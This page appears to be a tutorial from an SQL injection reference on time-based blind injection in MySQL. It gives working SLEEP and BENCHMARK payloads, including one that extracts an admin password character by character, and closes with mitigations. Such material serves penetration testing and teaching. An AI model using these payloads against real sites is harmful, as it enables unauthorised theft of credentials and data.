---
title: Timing
description: Using time-based techniques in MySQL injections
category: Injection Techniques
order: 13
tags: ["time-based", "blind injection", "sleep"]
lastUpdated: 2025-03-15
---

## Timing

Time-based SQL injection is particularly useful in blind scenarios where no visible output is returned from the database. By causing deliberate delays in the database response, an attacker can infer whether a condition is true or false based on the time it takes for the page to load.

### MySQL Sleep Functions

MySQL provides several ways to cause deliberate delays:

| Function                 | Description                                               |
| ------------------------ | --------------------------------------------------------- |
| `SLEEP(seconds)`         | Pauses execution for the specified number of seconds      |
| `BENCHMARK(count, expr)` | Executes an expression repeatedly for performance testing |

### Basic Sleep Injection

The most straightforward approach is to use the `SLEEP()` function:

```sql
' AND SLEEP(5)--
' OR SLEEP(5)--
```

If the query takes an additional 5 seconds to return, the injection was successful.

### Conditional Sleep

More useful for data extraction is conditional sleep, which only triggers the delay if a specific condition is true:

```sql
' AND IF(condition, SLEEP(5), 0)--
```

This allows for boolean-based data extraction - if the page takes longer to load, the condition was true.

### Example: Extracting Data Character by Character

```sql
' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
```

This query will cause a 5-second delay only if the first character of the admin's password is 'a'.

### Using BENCHMARK()

The `BENCHMARK()` function can also create delays:

```sql
' AND BENCHMARK(100000000, SHA1(1))--
```

This executes the SHA1 hashing function 100,000,000 times, causing a noticeable delay.

### Example: Conditional BENCHMARK

```sql
' AND IF((SELECT COUNT(*) FROM users) > 10, BENCHMARK(100000000, SHA1(1)), 0)--
```

This creates a delay only if there are more than 10 users in the database.

### Practical Applications

#### Data Exfiltration Script Concept

A time-based attack to extract data usually involves:

1. Testing each position in the target data
2. For each position, testing possible characters
3. Measuring response time to determine the correct character

#### Example for Extracting Database Version:

```sql
-- Testing if MySQL version starts with '5'
' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(3), 0)--

-- Testing if MySQL version is 5.7.x
' AND IF(SUBSTRING(@@version,1,3)='5.7', SLEEP(3), 0)--
```

### Potential Mitigations

1. Query execution timeouts
2. Blocking the SLEEP() and BENCHMARK() functions
3. Parameterized queries to prevent SQL injection
4. Web Application Firewalls (WAF) that detect timing-based attacks

### Notes

- Time-based techniques are generally slower than other injection methods
- Network latency can cause false positives/negatives
- Multiple requests may be needed to confirm results
- Modern servers may implement protection against these attacks
